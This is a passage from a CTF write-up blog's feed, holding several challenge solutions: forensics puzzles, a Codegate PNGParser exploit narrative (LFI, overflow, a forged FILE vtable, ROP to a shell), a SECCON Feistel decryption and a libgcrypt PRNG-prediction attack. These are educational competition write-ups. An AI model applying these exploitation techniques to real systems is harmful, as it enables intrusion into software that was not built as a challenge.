&lt;p&gt;&lt;code&gt;key.txt&lt;/code&gt; is a file which recorded the information about &lt;code&gt;ipsec&lt;/code&gt;. I spent some time at this stage to find more clues. Finally, I found another file &lt;code&gt;file_3&lt;/code&gt; hidden in &lt;code&gt;Forensic_Encyption&lt;/code&gt;. We can modify the header back to &lt;code&gt;PK&lt;/code&gt; and extract &lt;code&gt;file_3&lt;/code&gt;.&lt;br&gt;
&lt;code&gt;file_3&lt;/code&gt; is a pcap which recorded the traffic contained &lt;code&gt;ESP&lt;/code&gt; protocol. We can decrypt the traffic with &lt;code&gt;key.txt&lt;/code&gt; then get a html file.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Reflector&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="n"&gt;Thin&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;beta&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;IV&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;II&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt; &lt;span class="n"&gt;M&lt;/span&gt; &lt;span class="n"&gt;J&lt;/span&gt; &lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="n"&gt;Plugboard&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;L&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;X&lt;/span&gt;&lt;span class="sr"&gt;/A-C/&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Y&lt;/span&gt;

&lt;span class="n"&gt;TMCTF&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;APZTQQHYCKDLQZRG&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;APZTQQHYCKDLQZRG&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The cipher is encrypted by &lt;code&gt;enigma&lt;/code&gt;, but the website contained the encrypted key. Thus, we can decrypt the cipher easily.&lt;br&gt;
I use &lt;a href="http://summersidemakerspace.ca/projects/enigma-machine/"&gt;this&lt;/a&gt; to encrypt and get the real flag.&lt;br&gt;
The flag is: &lt;code&gt;TMCTF{RISINGSUNANDMOON}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Analysis-Offensive 200&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cracktheflag.exe&lt;/code&gt; is a simple passcode validator which received a number and judge if the number is a valid passcode.&lt;br&gt;
Surprisingly, this challege can be solved without any guessing.  &lt;/p&gt;
&lt;p&gt;The condition of the valid passcode is as below:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x1 = passcode / 10000 % 100
x2 = passcode / 100 % 100
x3 = passcode % 100

1. len(passcode) == 6 
2. `passcode` is primes
3. x1 is primes
4. x2 is primes
5. (x3 * x3 ^ x1) &amp;gt;&amp;gt; 8 == 0
6 sum(ascii(d) for d in passcode) - 288 is primes
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At first, I tried to solve it with &lt;strong&gt;z3&lt;/strong&gt;. However, it will spend a lot of time when checking prime. I decided to write a script to filter all possible solutions.&lt;br&gt;
We can list all of the primes which satisified condition 1 and 2, then filter them with condition 3 to 6.&lt;br&gt;
I found 7 solutions to satisify all conditions, and the biggest one is &lt;code&gt;236749&lt;/code&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;20509&lt;/li&gt;
&lt;li&gt;24109&lt;/li&gt;
&lt;li&gt;24709&lt;/li&gt;
&lt;li&gt;25309&lt;/li&gt;
&lt;li&gt;234149&lt;/li&gt;
&lt;li&gt;234749&lt;/li&gt;
&lt;li&gt;236749&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The program description said there are 8 possible solutions. I have no idea where is wrong.&lt;br&gt;
Anyway, the biggest passcode is the same.  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;TMCTF{236749}&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;Forensic 100&lt;/h3&gt;
&lt;p&gt;The pcap is a DNS traffic. According the description, there are some messages hidden in the traffic. The hostnames are very suspicious because the last one is shorter than others. I concated them and decode it with base64, but getting nothing. I stuck in this stage until organizers posted a hint which said the cipher is &lt;code&gt;base&lt;/code&gt; but not &lt;code&gt;base64&lt;/code&gt;.&lt;br&gt;
I tried to decode with familiar base familiy blindly, such as &lt;code&gt;base128&lt;/code&gt;, &lt;code&gt;base32&lt;/code&gt;. Obviously, it's wrong. Our teammate &lt;strong&gt;jeffxx&lt;/strong&gt; found only 58 charcaters appeared in the cipher, then I tried &lt;code&gt;base58&lt;/code&gt; and success to decode the cipher. The plaintext is an article and the flag is at the end.   &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;TMCTF{DNSTunnelExfil}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;MISC 100&lt;/h3&gt;
&lt;p&gt;I could not analyze the pcap with &lt;em&gt;wireshark&lt;/em&gt; at first because the header was corruption. However, I saw there are some strings begin with &lt;code&gt;CLIENT_RANDOM&lt;/code&gt; in the pcap. After googled, I known &lt;code&gt;CLIENT_RANDOM&lt;/code&gt; is encrypted keys used in HTTP2 traffic. Thus, I tried to repair the pcap. &lt;code&gt;file&lt;/code&gt; command said the pcap file is big-endien, but I compared with the other pacp file and found only the order of first 4 bytes is wrong. After fixed it, &lt;strong&gt;wireshark&lt;/strong&gt; could open the pcap normally and I could dump the object in HTTP2 traffic manually. I'm not sure if the latest wireshark support to dump HTTP2 object.  &lt;/p&gt;
&lt;p&gt;The traffic is someone access a website about &lt;strong&gt;visual cryptgraphy&lt;/strong&gt;. There are some pictures hidden in traffic and css. I stack at here then my teammate &lt;strong&gt;atdog&lt;/strong&gt; found a methond to overlap the iamges and get the flag. &amp;lt;(_ _)&amp;gt;.  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;TMCTF{CanYouSeeThis?}&lt;/code&gt;&lt;/p&gt;</content><category term="Engima"></category><category term="Wireshark"></category><category term="Frequency Analysis"></category><category term="Other CTF"></category></entry><entry><title>Codegate CTF 2017 prequals web+pwn 435 PNGParser</title><link href="https://ddaa.tw/codegate_web+pwn_435_pngparser.html" rel="alternate"></link><published>2017-02-13T11:34:00+08:00</published><updated>2017-02-13T11:34:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2017-02-13:/codegate_web+pwn_435_pngparser.html</id><summary type="html">&lt;p&gt;The challenges is more interesting than last year.&lt;br&gt;
However, why held the CTF on Friday? :(  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem description provided some website links for us. All of them are the same.&lt;br&gt;
There are two tags on the website. One of them is named &lt;code&gt;FILE UPLOAD&lt;/code&gt;, Another one is named &lt;code&gt;INTERNET&lt;/code&gt;.&lt;br&gt;
We …&lt;/p&gt;</summary><content type="html">&lt;p&gt;The challenges is more interesting than last year.&lt;br&gt;
However, why held the CTF on Friday? :(  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The problem description provided some website links for us. All of them are the same.&lt;br&gt;
There are two tags on the website. One of them is named &lt;code&gt;FILE UPLOAD&lt;/code&gt;, Another one is named &lt;code&gt;INTERNET&lt;/code&gt;.&lt;br&gt;
We could upload a PNG file from local or through internet.&lt;br&gt;
My teammate, &lt;strong&gt;jeffxx&lt;/strong&gt; found there is a LFI vulnerability in &lt;code&gt;INTERNET&lt;/code&gt; page.&lt;br&gt;
It can read any file after modified the protocol to &lt;code&gt;file://&lt;/code&gt;.&lt;br&gt;
However, the flag doesn't located on the general path.&lt;br&gt;
We could not read the flag directly, but we could download the source.&lt;br&gt;
After reading source, we could find a elf file named &lt;code&gt;PNGParser&lt;/code&gt; will be executed when the website handled the uploaded PNG file.  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;PNGPareser&lt;/code&gt; must be executed with one argument &lt;code&gt;file_name&lt;/code&gt;.&lt;br&gt;
It will parse the file and dump each entry in the file if the file is a legal PNG file.&lt;br&gt;
I decided to fuzz the binary after openen it wit &lt;strong&gt;IDA Pro&lt;/strong&gt; because the parser is a little complicated.&lt;br&gt;
Luckily, the binary crashed easily and the error message was:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;*** Error in `./pngparser': double free or corruption (out): 0x089f0598 ***&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Now, we knowed the crashed point at &lt;code&gt;0x089f0598&lt;/code&gt;, but why it crashed ?.&lt;br&gt;
With the program slicing skill that I learned from Software Debugging, I found the fault is happened on &lt;code&gt;0x0804946d&lt;/code&gt;.&lt;br&gt;
Heap overflow happened after the program called &lt;code&gt;memcpy()&lt;/code&gt; and the buffer that stored the PNG content overwrote the top chunk.&lt;br&gt;
In order to understand what happened, we need to take a look on PNG stcucture before going on.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cm"&gt;/* Some members may not be exactly. Sorry for my indolence. */&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
struct&lt;span class="w"&gt; &lt;/span&gt;PNG&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;int&lt;span class="w"&gt; &lt;/span&gt;status&lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;char&lt;span class="w"&gt; &lt;/span&gt;header&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="m"&gt;8&lt;/span&gt;&lt;span class="err"&gt;];&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;char&lt;span class="w"&gt; &lt;/span&gt;next&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="err"&gt;];&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;int&lt;span class="w"&gt; &lt;/span&gt;chunk_size&lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;void&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;data_ptr&lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;int&lt;span class="w"&gt; &lt;/span&gt;size1&lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;int&lt;span class="w"&gt; &lt;/span&gt;size2&lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;char&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;buf&lt;span class="err"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="w"&gt;  &lt;/span&gt;char&lt;span class="w"&gt; &lt;/span&gt;entry&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="err"&gt;];&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;span class="err"&gt;};&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And here is a piece of pseudocode nearby &lt;code&gt;memcpy()&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;int parse_png(PNG *png, char *buf, size_t len)
{
  ...
  while ( i &amp;lt; len )
  {
    if ( len - i &amp;gt;= png-&amp;gt;s1 - png-&amp;gt;s2 )
      v4 = png-&amp;gt;s1 - png-&amp;gt;s2;
    else
      v4 = 2000;
    cmp_header(&amp;amp;png-&amp;gt;header[4], &amp;quot;PLTE&amp;quot;);
    memcpy(&amp;amp;png-&amp;gt;buf[png-&amp;gt;s2], &amp;amp;buf[i], v4);
    png-&amp;gt;s2 += v4;
    i += v4;
    if ( png-&amp;gt;s2 &amp;gt;= png-&amp;gt;s1 )
    {
      v5 = parse_entry(png);
      if ( !v5 )
        return 0;
    }
  }
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;len&lt;/code&gt; is the return value of &lt;code&gt;fread()&lt;/code&gt; in main function. &lt;br&gt;
Its maximum value is &lt;code&gt;0x10000&lt;/code&gt; because the third argument of &lt;code&gt;fread()&lt;/code&gt; is equal to 0x10000.&lt;br&gt;
We can control the value of &lt;code&gt;len&lt;/code&gt; easily through cutting the PNG files.&lt;br&gt;
&lt;code&gt;parse_png()&lt;/code&gt; will parse from the start entry (&lt;code&gt;png-&amp;gt;header&lt;/code&gt; == "\x89PDF\x0d\x0a\x1a\x0a") at first.&lt;br&gt;
Next, calulate the offset of next entry and parse each by each until reach &lt;code&gt;IEND&lt;/code&gt; entry.&lt;br&gt;
We can construct a PNG file, which has a entry that the real size is smaller than the size field.&lt;br&gt;
And then, the condition &lt;code&gt;len - i &amp;gt;= png-&amp;gt;s1 - png-&amp;gt;s2&lt;/code&gt; will be satisfied and &lt;code&gt;v4&lt;/code&gt; will be set to 2000.&lt;br&gt;
Overflow will happened because the size of &lt;code&gt;png-&amp;gt;buf&lt;/code&gt; is determined by &lt;code&gt;png-&amp;gt;chunk_size&lt;/code&gt;.  &lt;/p&gt;
&lt;p&gt;Sounds great. However, we still need to overcome a little trouble.&lt;br&gt;
First, each PNG entry has a crc field, so we cannot modify the PNG file directly.&lt;br&gt;
We must calulate the correct crc checksum for each entry in PNG file after modified.&lt;br&gt;
Second, &lt;code&gt;PNGParser&lt;/code&gt; is a non-interactive program, it means ASLR will become a knotty problem.&lt;br&gt;
Most of heap exploitation skills need to know the memory layout.&lt;br&gt;
In fact, I didn't think out a efficient method to exploit this challenge through heap exploitation.&lt;br&gt;
However, at the same line, &lt;code&gt;memcpy()&lt;/code&gt; is possible to trigger stack overflow !  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;int parse_entry(PNG *a1)
{
...
    case 0xD:
LABEL_12:
      a1-&amp;gt;status = 0xE;
      a1-&amp;gt;s1 = 4;
      a1-&amp;gt;s2 = 0;
      a1-&amp;gt;buf = a1-&amp;gt;next;
      goto LABEL_17;
...
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is a switch case in &lt;code&gt;parse_entry()&lt;/code&gt;. Accoring to &lt;code&gt;png-&amp;gt;status&lt;/code&gt;, entry will be handle by different ways.&lt;br&gt;
In the most case, &lt;code&gt;png-&amp;gt;buf&lt;/code&gt; will store the address of malloc buffer, except &lt;code&gt;png-&amp;gt;status&lt;/code&gt; is equal 0xd.&lt;br&gt;
In this case, &lt;code&gt;png-&amp;gt;buf&lt;/code&gt; will point to the address of &lt;code&gt;png-&amp;gt;next&lt;/code&gt; and &lt;code&gt;png-&amp;gt;status&lt;/code&gt; become 0xe.&lt;br&gt;
Let's see where is the varaible &lt;code&gt;png&lt;/code&gt; ... It is a local variable in &lt;code&gt;main()&lt;/code&gt;.&lt;br&gt;
Thus, if the entry which status is equal to 0xe happened overflow, we can control the partial stack of &lt;code&gt;main()&lt;/code&gt;.   &lt;/p&gt;
&lt;p&gt;It seems to be left to do the ROP and shell out ... Not yet! O__Q&lt;br&gt;
Although we have overwriten the stack of &lt;code&gt;main()&lt;/code&gt;, but we cannot go well to reach &lt;code&gt;return&lt;/code&gt;.&lt;br&gt;
The segmentation fault will still happen in &lt;code&gt;feof()&lt;/code&gt; because the file descriptor was overwritten.&lt;br&gt;
We must forge a fake FILE structure to prevent the program crashed.&lt;br&gt;
But, where can we forge the sturcture? Remember, we don't know the memory layout.&lt;br&gt;
I stucked at here for a while, then I found &lt;code&gt;tEXt&lt;/code&gt; entry can help us!. &lt;br&gt;
The content of &lt;code&gt;tEXt&lt;/code&gt; entry will be copy to the bss section whose address is &lt;code&gt;0x0804e4de&lt;/code&gt;.&lt;br&gt;
Notice, null byte cannot appear in the &lt;code&gt;tEXt&lt;/code&gt; entry, so we cannot forge it completely.&lt;br&gt;
Our goal is just that let &lt;code&gt;feof()&lt;/code&gt; return gracefully. Luckily, the binary is x86 architecutre.&lt;br&gt;
Thus, we can reach the goal and forge the vtable in the FILE structure incidentally.&lt;br&gt;
I made one of vtable function to &lt;code&gt;add esp, 0xd8&lt;/code&gt; and it will be used in &lt;code&gt;fread()&lt;/code&gt;.&lt;br&gt;
After that, the control flow will enter our rop payload when executing &lt;code&gt;fread()&lt;/code&gt;.&lt;br&gt;
Finally, we can do ROP easily and shell out! :)&lt;/p&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/pngparser.py"&gt;exp.py&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;FLAG{sh3_1s_b3t1fu1_#$%}&lt;/code&gt;&lt;/p&gt;</content><category term="Codegate CTF"></category><category term="Stack Overflow"></category><category term="LFI"></category></entry><entry><title>SECCON 2016 Binary+Crypto 200 Lost Decryption</title><link href="https://ddaa.tw/seccon_re+crypto_200_lostdecryption.html" rel="alternate"></link><published>2016-12-13T02:43:00+08:00</published><updated>2016-12-13T02:43:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2016-12-13:/seccon_re+crypto_200_lostdecryption.html</id><summary type="html">&lt;p&gt;這題是 pwn 題被大家掃光之後&lt;br&gt;
不得以之下只好來看的題目...&lt;br&gt;
Crypto is so difficult. Orz&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目給了三個檔案 &lt;strong&gt;cipher&lt;/strong&gt;, &lt;strong&gt;libencrypt.so&lt;/strong&gt;, &lt;strong&gt;flag.enc&lt;/strong&gt;&lt;br&gt;
cipher 沒辦法執行, 會噴出以下 error:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;./cipher: error while loading shared libraries: libdecrypt.so: cannot open shared object file: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把 cipher 丟到 ida pro 以後可以大致分析出行為:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Usage: cipher (encrypt|decrypt) key input output …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;這題是 pwn 題被大家掃光之後&lt;br&gt;
不得以之下只好來看的題目...&lt;br&gt;
Crypto is so difficult. Orz&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目給了三個檔案 &lt;strong&gt;cipher&lt;/strong&gt;, &lt;strong&gt;libencrypt.so&lt;/strong&gt;, &lt;strong&gt;flag.enc&lt;/strong&gt;&lt;br&gt;
cipher 沒辦法執行, 會噴出以下 error:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;./cipher: error while loading shared libraries: libdecrypt.so: cannot open shared object file: No such file or directory&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;把 cipher 丟到 ida pro 以後可以大致分析出行為:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Usage: cipher (encrypt|decrypt) key input output&lt;/li&gt;
&lt;li&gt;可以藉由第二個參數選擇要加密還是解密, 分別會 call &lt;code&gt;encrypt(buf, key)&lt;/code&gt; 或 &lt;code&gt;decrypt(buf, key)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;加密的方式是 block cipher, block size = key length = 16 byte&lt;/li&gt;
&lt;li&gt;依序將加密或解密後的結果寫進 output file&lt;/li&gt;
&lt;li&gt;如果 input 不是 16 的倍數, 最後會補上 padding&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;這題的關鍵還是在 libencrypt.so 上, 裡面只有一個加密 function&lt;br&gt;
encrypt 會做 14 次 xor, xor key 由一個亂七八糟的 function 產生&lt;br&gt;
xor 完會將 block 的前半和後半做交換  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;258 void __fastcall encrypt(char *buf, char *key)
...
273   do
274   {
275     v5 = sub_8a0(b1, k1);
276     b0 ^= v5;
277     k1 = sub_8a0(k1, 0x9104F95DE694DC50LL);
278     xchg(&amp;amp;b0);
279     xchg(&amp;amp;k0);
280     --i;
281   }
282   while ( i );
...
286 }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;如果有修過密碼學, 應該一眼就可以感覺出這是典型的 &lt;strong&gt;feistel cipher&lt;/strong&gt;&lt;br&gt;
feistel cipher 的特徵就是解密就是加密的倒過來&lt;br&gt;
所以這題其實不用看懂 &lt;code&gt;sub_8a0&lt;/code&gt; 到底在做什麼&lt;br&gt;
直接拿來用就可以了&lt;br&gt;
k1 就是 feistel cipher 的 round key, 用來產生 xor 用的 key&lt;br&gt;
round key 不受 cipher 影響, 可以跑 14 round 得到所有的 round key&lt;br&gt;
可以用 ida pro decompile &lt;code&gt;sub_8a0&lt;/code&gt; 寫一個解密的 function:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;void decrypt(int *buf)
{
    __int64 k1[14] = {0x7071370944faa683, 0xc936fe92f5be592, 0xfb865e2b2a6216f, 0x89745418b4f3701d, 0xfa8b683d8876468f, 0xe2185b1aa6ace4c2, 0xf6f840cc5548b290, 0xeb42f12db34bcecc, 0xe3459923a1fadfda, 0x3ac1150762625475, 0xccb7b4ad260cfb29, 0xb2007c75f4bad138, 0x8850ec377c7449b6 , 0x1ba31bdc8631ecd6};

    int b[2] = {buf[0], buf[1]};
    xchg(&amp;amp;b);
    for (int i = 13; i &amp;gt;= 0; i--) {
        xchg(&amp;amp;b);
        b[0] ^= sub_8a0(b[1], k1[i]);
    }
    xchg(&amp;amp;b);
    buf[0] = b[0];
    buf[1] = b[1];
 }
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;編譯成執行檔後, 就可以拿來 decrypt flag.enc 的內容了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;SECCON{Decryption_Of_Feistel_is_EASY!}&lt;/code&gt;&lt;/p&gt;</content><category term="SECCON CTF"></category><category term="Feistel Cipher"></category></entry><entry><title>HITCON CTF 2016 crypto 150 OTP</title><link href="https://ddaa.tw/hitcon_crypto_150_otp.html" rel="alternate"></link><published>2016-10-13T20:13:00+08:00</published><updated>2016-10-13T20:13:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2016-10-13:/hitcon_crypto_150_otp.html</id><summary type="html">&lt;p&gt;Sovled: 12 / 1024&lt;/p&gt;
&lt;p&gt;今年是第一次以出題方的身分參加 HITCON CTF&lt;br&gt;
一直很擔心自己的題目不夠水準&lt;br&gt;
有一點低估自己的題目難度了&lt;br&gt;
以解題人數來看, 這題應該可以加到 200 分  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;otp 的行為是接收使用者的明文&lt;br&gt;
隨機產生一組長度等於 明文 + flag 的 xor key&lt;br&gt;
透過 xor 加密 明文 + flag 並回傳給使用者&lt;br&gt;
並且可以選擇透過何種方式產生 xor key  &lt;/p&gt;
&lt;p&gt;這題主要考的是 &lt;strong&gt;CVE-2016-6316&lt;/strong&gt;&lt;br&gt;
libgcrypt 實作 PRNG 有缺陷&lt;br&gt;
導致每獲得 580 byte 之後, 就可以算出接下來的 20 byte&lt;br&gt;
在取得 random number 以後, 都會取目前 random pool 的部分內容做 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sovled: 12 / 1024&lt;/p&gt;
&lt;p&gt;今年是第一次以出題方的身分參加 HITCON CTF&lt;br&gt;
一直很擔心自己的題目不夠水準&lt;br&gt;
有一點低估自己的題目難度了&lt;br&gt;
以解題人數來看, 這題應該可以加到 200 分  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;otp 的行為是接收使用者的明文&lt;br&gt;
隨機產生一組長度等於 明文 + flag 的 xor key&lt;br&gt;
透過 xor 加密 明文 + flag 並回傳給使用者&lt;br&gt;
並且可以選擇透過何種方式產生 xor key  &lt;/p&gt;
&lt;p&gt;這題主要考的是 &lt;strong&gt;CVE-2016-6316&lt;/strong&gt;&lt;br&gt;
libgcrypt 實作 PRNG 有缺陷&lt;br&gt;
導致每獲得 580 byte 之後, 就可以算出接下來的 20 byte&lt;br&gt;
在取得 random number 以後, 都會取目前 random pool 的部分內容做 hash&lt;br&gt;
再存回 random pool 打亂 entropy&lt;br&gt;
原本演算法的設計是取 &lt;code&gt;pool[L-40:L+44]&lt;/code&gt;&lt;br&gt;
但 libgcrypt 在實作時卻取了 &lt;code&gt;pool[L-40:L-20] + pool[L:L+44]&lt;/code&gt;&lt;br&gt;
中間漏掉了一個 block, 導致在不需知道全部的 pool 的情況下&lt;br&gt;
就可以算出 next state&lt;br&gt;
詳細的原理在這篇: &lt;a href="http://formal.iti.kit.edu/~klebanov/pubs/libgcrypt-cve-2016-6313.pdf"&gt;Entropy Loss and Output Predictability in theLibgcrypt PRNG&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;文章中沒有詳細描述 libgcrypt 的 hash method&lt;br&gt;
需要自行 trace libgcrypt source code&lt;br&gt;
根據文件指出的 &lt;code&gt;mix_pool&lt;/code&gt;, 會發現以下的程式碼&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; 603   gcry_assert (pool_is_locked);
 604   _gcry_sha1_mixblock_init (&amp;amp;md);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;因此可以得知實作時是用 sha1 做 hash&lt;br&gt;
並且是透過 update 的方式取得 sha1 的結果&lt;br&gt;
我一開始沒看仔細, 實作 poc 的時候一直以為是每次取新的 sha1&lt;br&gt;
卡了一小段時間 Orz&lt;/p&gt;
&lt;p&gt;得知以上幾點之後, 就可以開始解這題了&lt;br&gt;
步驟如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;加密時輸入長度為 580 byte 的明文, 接收到 580 + n byte 的密文&lt;/li&gt;
&lt;li&gt;將明文和密文的前 580 byte xor, 得到 xor key 的前 580 byte, 也就是加密第 29 個 block 時, random pool 的 state&lt;/li&gt;
&lt;li&gt;計算 &lt;code&gt;sha1_update(xorkey[560:580] + xorkey[0:44])&lt;/code&gt;, 結果即是第 30 個 block 的 state&lt;/li&gt;
&lt;li&gt;由於我們不知道 random pool 最早的狀態, 不能每個 block 陸續做 &lt;code&gt;sha1_update&lt;/code&gt; 得到目前的 state&lt;/li&gt;
&lt;li&gt;要利用類似 length extension attack 的手法, 將初始的常數換成上一次 sha1 的結果, 也就是 &lt;code&gt;xorkey[560:580]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;將計算出的結果與密文 xor, 可以得到 flag 的前 20 byte&lt;/li&gt;
&lt;li&gt;再次加密, 這次長度輸入 560 byte, 由於我們已經知道 flag 的前 20 byte, 因此一樣可以算出 580 byte 的 xor key&lt;/li&gt;
&lt;li&gt;重做 2 ~ 4 步驟就可以得到 flag 剩下的部分&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href="https://ddaa.tw/exp/otp.py"&gt;otp.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;hitcon{N0_n33d_t0_rev0k3_pr1v4te_k3y}&lt;/code&gt;&lt;/p&gt;</content><category term="PRNG"></category><category term="CVE"></category></entry><entry><title>BCTF 2016 crypto 200 Special RSA</title><link href="https://ddaa.tw/bctf_crypto_200_special_rsa.html" rel="alternate"></link><published>2016-03-21T20:13:00+08:00</published><updated>2016-03-21T20:13:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2016-03-21:/bctf_crypto_200_special_rsa.html</id><summary type="html">&lt;p&gt;這題是很基本的 crypto 題目&lt;br&gt;
從有 94 隊解就知道了...= =&lt;br&gt;
不過我還是想了好久 QQ&lt;br&gt;
對現代密碼學實在不太擅長&lt;br&gt;
這次一邊解一邊研究模運算&lt;br&gt;
趁記憶深刻趕快寫這篇 write-up  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目雖然叫 &lt;strong&gt;Special RSA&lt;/strong&gt; 但是這題跟 RSA 其實沒有很大關連...&lt;br&gt;
還比較像 ElGamel encryption = =&lt;br&gt;
害我還跑去看 ElGamel 有什麼弱點 囧  &lt;/p&gt;
&lt;p&gt;題目給了四個檔案:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;special_rsa.py&lt;/li&gt;
&lt;li&gt;msg.txt&lt;/li&gt;
&lt;li&gt;msg.enc&lt;/li&gt;
&lt;li&gt;flag.enc&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;special_rsa.py&lt;/code&gt; 有 usage, 真好心 XD &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;dada@ubuntu:~/bctf/special_rsa$ ./special_rsa.py&lt;br&gt;
